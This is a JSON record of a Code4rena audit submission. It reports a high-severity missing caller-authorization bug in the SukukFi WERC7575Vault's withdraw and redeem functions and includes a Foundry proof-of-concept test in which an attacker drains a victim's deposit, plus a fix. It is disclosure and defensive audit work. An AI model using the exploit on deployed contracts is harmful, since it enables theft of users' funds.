@@ -1,0 +1,120 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "sQGYn49PVVj",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "sQGYn49PVVj",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_sQGYn49PVVj.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "sQGYn49PVVj",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "[H-01]Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "TOSHI",
+  "body": "# Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft\n\n## Severity\n\n**HIGH**\n\n## Summary\n\nThe `withdraw()` and `redeem()` functions in `WERC7575Vault.sol` accept an arbitrary `owner` parameter but only verify the owner's self-allowance via `spendSelfAllowance()`. They fail to check whether `msg.sender` is authorized by the owner, allowing any external account to steal funds from any user with active self-allowance.\n\n## Vulnerability Detail\n\nThe vault's withdrawal functions violate the ERC-4626 specification by omitting caller authorization:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    if (owner == address(0)) revert IERC20Errors.ERC20InvalidSender(address(0));\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);  // Only checks owner's self-allowance\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\nThe function accepts any `owner` address from any caller and only verifies that the `owner` has self-allowance (platform permission). There is no check that `msg.sender == owner` or that `allowance[owner][msg.sender] >= shares`.\n\nPer ERC-4626, when `msg.sender != owner`, the vault MUST verify caller authorization. This check is completely absent.\n\n## Impact\n\nAny external account can drain 100% of any user's vault deposits by calling:\n\n```solidity\nvault.withdraw(victimAssets, attackerAddress, victimAddress)\n```\n\nPrerequisites:\n- Victim has deposited funds into the vault\n- Victim has self-allowance granted by validator (required for normal protocol operation)\n\nNo approval from victim required. No user interaction needed. Attack cost is only gas fees.\n\n## Recommended Mitigation\n\nAdd caller authorization check to both `withdraw()` and `redeem()`:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    \n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction redeem(uint256 shares, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 assets) \n{\n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    assets = previewRedeem(shares);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {MockAsset} from \"./MockAsset.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {Test, console} from \"forge-std/Test.sol\";\n\ncontract MissingCallerAuthExploitTest is Test {\n    WERC7575Vault public vault;\n    WERC7575ShareToken public shareToken;\n    MockAsset public asset;\n\n    address public owner = makeAddr(\"owner\");\n    address public alice = makeAddr(\"alice\");\n    address public mallory = makeAddr(\"mallory\");\n\n    uint256 public validatorKey = 0x1234;\n    uint256 public constant DEPOSIT = 10_000e18;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        asset = new MockAsset();\n        shareToken = new WERC7575ShareToken(\"Shares\", \"SHR\");\n        shareToken.setValidator(vm.addr(validatorKey));\n        shareToken.setKycAdmin(owner);\n        vault = new WERC7575Vault(address(asset), shareToken);\n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setKycVerified(alice, true);\n        shareToken.setKycVerified(mallory, true);\n        shareToken.setKycVerified(address(vault), true);\n        vm.stopPrank();\n\n        asset.mint(alice, DEPOSIT);\n\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT);\n        vault.deposit(DEPOSIT, alice);\n        vm.stopPrank();\n\n        _grantSelfAllowance(alice, type(uint256).max);\n    }\n\n    function _grantSelfAllowance(address user, uint256 amount) internal {\n        bytes32 hash = keccak256(abi.encode(\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n            user, user, amount, shareToken.nonces(user), block.timestamp + 1 hours\n        ));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), hash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorKey, digest);\n        shareToken.permit(user, user, amount, block.timestamp + 1 hours, v, r, s);\n    }\n\n    function test_UnauthorizedWithdrawal() public {\n        // Verify Mallory has no allowance\n        assertEq(shareToken.allowance(alice, mallory), 0);\n        assertGt(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), 0);\n\n        // Attack: Mallory steals Alice's funds\n        vm.prank(mallory);\n        vault.withdraw(DEPOSIT, mallory, alice);\n\n        // Verify exploit\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice lost shares\");\n        assertEq(asset.balanceOf(mallory), DEPOSIT, \"Mallory stole funds\");\n    }\n\n    function test_UnauthorizedRedeem() public {\n        uint256 shares = shareToken.balanceOf(alice);\n        \n        vm.prank(mallory);\n        vault.redeem(shares, mallory, alice);\n\n        assertEq(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), DEPOSIT);\n    }\n}\n```\n\nRun with:\n\n```bash\nforge test --match-contract MissingCallerAuthExploitTest -vvv\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L434",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "213",
+    "api_submission_id": "",
+    "uid": "sQGYn49PVVj",
+    "number": "213",
+    "title": "[H-01]Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "TOSHI",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L434",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397"
+    ],
+    "body": "# Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft\n\n## Severity\n\n**HIGH**\n\n## Summary\n\nThe `withdraw()` and `redeem()` functions in `WERC7575Vault.sol` accept an arbitrary `owner` parameter but only verify the owner's self-allowance via `spendSelfAllowance()`. They fail to check whether `msg.sender` is authorized by the owner, allowing any external account to steal funds from any user with active self-allowance.\n\n## Vulnerability Detail\n\nThe vault's withdrawal functions violate the ERC-4626 specification by omitting caller authorization:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    if (owner == address(0)) revert IERC20Errors.ERC20InvalidSender(address(0));\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);  // Only checks owner's self-allowance\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\nThe function accepts any `owner` address from any caller and only verifies that the `owner` has self-allowance (platform permission). There is no check that `msg.sender == owner` or that `allowance[owner][msg.sender] >= shares`.\n\nPer ERC-4626, when `msg.sender != owner`, the vault MUST verify caller authorization. This check is completely absent.\n\n## Impact\n\nAny external account can drain 100% of any user's vault deposits by calling:\n\n```solidity\nvault.withdraw(victimAssets, attackerAddress, victimAddress)\n```\n\nPrerequisites:\n- Victim has deposited funds into the vault\n- Victim has self-allowance granted by validator (required for normal protocol operation)\n\nNo approval from victim required. No user interaction needed. Attack cost is only gas fees.\n\n## Recommended Mitigation\n\nAdd caller authorization check to both `withdraw()` and `redeem()`:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    \n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction redeem(uint256 shares, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 assets) \n{\n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    assets = previewRedeem(shares);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {MockAsset} from \"./MockAsset.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {Test, console} from \"forge-std/Test.sol\";\n\ncontract MissingCallerAuthExploitTest is Test {\n    WERC7575Vault public vault;\n    WERC7575ShareToken public shareToken;\n    MockAsset public asset;\n\n    address public owner = makeAddr(\"owner\");\n    address public alice = makeAddr(\"alice\");\n    address public mallory = makeAddr(\"mallory\");\n\n    uint256 public validatorKey = 0x1234;\n    uint256 public constant DEPOSIT = 10_000e18;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        asset = new MockAsset();\n        shareToken = new WERC7575ShareToken(\"Shares\", \"SHR\");\n        shareToken.setValidator(vm.addr(validatorKey));\n        shareToken.setKycAdmin(owner);\n        vault = new WERC7575Vault(address(asset), shareToken);\n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setKycVerified(alice, true);\n        shareToken.setKycVerified(mallory, true);\n        shareToken.setKycVerified(address(vault), true);\n        vm.stopPrank();\n\n        asset.mint(alice, DEPOSIT);\n\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT);\n        vault.deposit(DEPOSIT, alice);\n        vm.stopPrank();\n\n        _grantSelfAllowance(alice, type(uint256).max);\n    }\n\n    function _grantSelfAllowance(address user, uint256 amount) internal {\n        bytes32 hash = keccak256(abi.encode(\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n            user, user, amount, shareToken.nonces(user), block.timestamp + 1 hours\n        ));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), hash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorKey, digest);\n        shareToken.permit(user, user, amount, block.timestamp + 1 hours, v, r, s);\n    }\n\n    function test_UnauthorizedWithdrawal() public {\n        // Verify Mallory has no allowance\n        assertEq(shareToken.allowance(alice, mallory), 0);\n        assertGt(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), 0);\n\n        // Attack: Mallory steals Alice's funds\n        vm.prank(mallory);\n        vault.withdraw(DEPOSIT, mallory, alice);\n\n        // Verify exploit\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice lost shares\");\n        assertEq(asset.balanceOf(mallory), DEPOSIT, \"Mallory stole funds\");\n    }\n\n    function test_UnauthorizedRedeem() public {\n        uint256 shares = shareToken.balanceOf(alice);\n        \n        vm.prank(mallory);\n        vault.redeem(shares, mallory, alice);\n\n        assertEq(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), DEPOSIT);\n    }\n}\n```\n\nRun with:\n\n```bash\nforge test --match-contract MissingCallerAuthExploitTest -vvv\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/213",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-11-30T00:42:25.865Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "k7SV6SkNnyB",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T09:03:15.694Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "sQGYn49PVVj",
+          "findingUid": null
+        },
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "[H-01]Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft",
+      "uid": "sQGYn49PVVj",
+      "updatedAt": "2025-11-30T00:42:25.865Z",
+      "user": {
+        "uid": "pRtu9brpzwQ",
+        "handle": "TOSHI"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "# Missing Caller Authorization in WERC7575Vault Enables Unauthorized Fund Theft\n\n## Severity\n\n**HIGH**\n\n## Summary\n\nThe `withdraw()` and `redeem()` functions in `WERC7575Vault.sol` accept an arbitrary `owner` parameter but only verify the owner's self-allowance via `spendSelfAllowance()`. They fail to check whether `msg.sender` is authorized by the owner, allowing any external account to steal funds from any user with active self-allowance.\n\n## Vulnerability Detail\n\nThe vault's withdrawal functions violate the ERC-4626 specification by omitting caller authorization:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    if (owner == address(0)) revert IERC20Errors.ERC20InvalidSender(address(0));\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);  // Only checks owner's self-allowance\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\nThe function accepts any `owner` address from any caller and only verifies that the `owner` has self-allowance (platform permission). There is no check that `msg.sender == owner` or that `allowance[owner][msg.sender] >= shares`.\n\nPer ERC-4626, when `msg.sender != owner`, the vault MUST verify caller authorization. This check is completely absent.\n\n## Impact\n\nAny external account can drain 100% of any user's vault deposits by calling:\n\n```solidity\nvault.withdraw(victimAssets, attackerAddress, victimAddress)\n```\n\nPrerequisites:\n- Victim has deposited funds into the vault\n- Victim has self-allowance granted by validator (required for normal protocol operation)\n\nNo approval from victim required. No user interaction needed. Attack cost is only gas fees.\n\n## Recommended Mitigation\n\nAdd caller authorization check to both `withdraw()` and `redeem()`:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 shares) \n{\n    shares = previewWithdraw(assets);\n    \n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction redeem(uint256 shares, address receiver, address owner) \n    public nonReentrant whenNotPaused returns (uint256 assets) \n{\n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed < shares) {\n            revert ERC20InsufficientAllowance(msg.sender, allowed, shares);\n        }\n    }\n    \n    assets = previewRedeem(shares);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {MockAsset} from \"./MockAsset.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {Test, console} from \"forge-std/Test.sol\";\n\ncontract MissingCallerAuthExploitTest is Test {\n    WERC7575Vault public vault;\n    WERC7575ShareToken public shareToken;\n    MockAsset public asset;\n\n    address public owner = makeAddr(\"owner\");\n    address public alice = makeAddr(\"alice\");\n    address public mallory = makeAddr(\"mallory\");\n\n    uint256 public validatorKey = 0x1234;\n    uint256 public constant DEPOSIT = 10_000e18;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        asset = new MockAsset();\n        shareToken = new WERC7575ShareToken(\"Shares\", \"SHR\");\n        shareToken.setValidator(vm.addr(validatorKey));\n        shareToken.setKycAdmin(owner);\n        vault = new WERC7575Vault(address(asset), shareToken);\n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setKycVerified(alice, true);\n        shareToken.setKycVerified(mallory, true);\n        shareToken.setKycVerified(address(vault), true);\n        vm.stopPrank();\n\n        asset.mint(alice, DEPOSIT);\n\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT);\n        vault.deposit(DEPOSIT, alice);\n        vm.stopPrank();\n\n        _grantSelfAllowance(alice, type(uint256).max);\n    }\n\n    function _grantSelfAllowance(address user, uint256 amount) internal {\n        bytes32 hash = keccak256(abi.encode(\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n            user, user, amount, shareToken.nonces(user), block.timestamp + 1 hours\n        ));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), hash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorKey, digest);\n        shareToken.permit(user, user, amount, block.timestamp + 1 hours, v, r, s);\n    }\n\n    function test_UnauthorizedWithdrawal() public {\n        // Verify Mallory has no allowance\n        assertEq(shareToken.allowance(alice, mallory), 0);\n        assertGt(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), 0);\n\n        // Attack: Mallory steals Alice's funds\n        vm.prank(mallory);\n        vault.withdraw(DEPOSIT, mallory, alice);\n\n        // Verify exploit\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice lost shares\");\n        assertEq(asset.balanceOf(mallory), DEPOSIT, \"Mallory stole funds\");\n    }\n\n    function test_UnauthorizedRedeem() public {\n        uint256 shares = shareToken.balanceOf(alice);\n        \n        vm.prank(mallory);\n        vault.redeem(shares, mallory, alice);\n\n        assertEq(shareToken.balanceOf(alice), 0);\n        assertEq(asset.balanceOf(mallory), DEPOSIT);\n    }\n}\n```\n\nRun with:\n\n```bash\nforge test --match-contract MissingCallerAuthExploitTest -vvv\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L434,https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397",
+      "number": 213,
+      "aiExplanation": null,
+      "_index": 213
+    }
+  }
+}
